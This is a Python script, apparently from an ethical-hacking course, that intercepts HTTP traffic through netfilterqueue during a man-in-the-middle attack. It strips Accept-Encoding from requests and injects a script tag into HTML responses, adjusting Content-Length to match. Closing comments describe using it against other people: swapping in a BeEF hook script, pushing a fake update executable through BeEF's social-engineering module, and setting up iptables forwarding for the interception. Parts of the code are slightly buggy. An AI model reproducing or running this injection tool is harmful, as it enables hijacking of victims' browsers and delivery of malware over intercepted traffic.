#!/usr/bin/env python 
# refacturing code declared load variable for scapy_packet[scapy.Raw].load replaced modified_load with load
# repeatd code is placed in another if condn
import scapy.all as scapy
import netfilterqueue
import re 
def set_load(packet,load):
    scapy_packet[scapy.Raw].load=load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())#1convert to scapy packet
    if scapy_packet.haslayer(scapy.Raw): 
        load=scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport==80:#80 implies http port
            print("[+] HTTP request")
            load=re.sub("Accept-Encoding:.*?\\r\\n","",load)#sub implies substitute or replace "" emplies with nothing."Accept-Encoding:.*?\\r\\n" is re pattern to repalce with empty
            # load=load.replace("HTTP/1.1","HTTP/1.0")#for https 
            print(scapy_packet.show())#check request has been changed test in your sys no accept encoding field and response has plane content
 
        elif scapy_packet[scapy.TCP].sport==80:#80 implies http port
            print("[+] HTTP response")
            injection_code="<script>alert('hacked');</script>"
            load=load.replace("</body>",injection_code + "</body")
            content_length_search=re.search("(?:Content-Length:\s)(\d*)",load)#we only need no \d* but not Content-Length:\s so first group non capturing usind(?:)
        
            if content_length_search and "text/html" in load:#change content length of only html not of js ,css etc because we enjected code for only html
                content_length = content_length_search.group(1)#have digit capturing group
                new_content_length=int(content_length) + len(injection_code)
                load=load.replace(content_length,str(new_content_length))

                # print(content_length)
             
            print(scapy_packet.show())  
            # check for any website eg bing.com and get response with data(html) in hex form in raw label and load field
        if load!=scapy_packet[scapy.Raw].load:
            new_packet=set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

              
    packet.accept() 
queue=netfilterqueue.NetfilterQueue()#cerate object to interact with queue number 0 as specified as command in unix sys
queue.bind(0,process_packet) 
queue.run()


# only for http website why bing.com is http?
# this code maynot work for all website because there is content length specifide for the html bt server in raw field
# so when we inject our code the size if html file gets changed so website only renders upto the part for which content length specified
# in order to work for all the website ,we have to increase(change) content length upto our added code content length
# so need to calculate size(content-length) and change it   

# use to target other
# if  want to use beef and hook target browser replace added script with hook script in code.one note change the ip in hook code  
# use clippy social engineering command of beef and provide update exe ,provide your ip 
# for http pages eg winzip.com
#ip table flush, ip table forward chain,ip forwarding using etc 1>..for mimf ,run mimf,run script 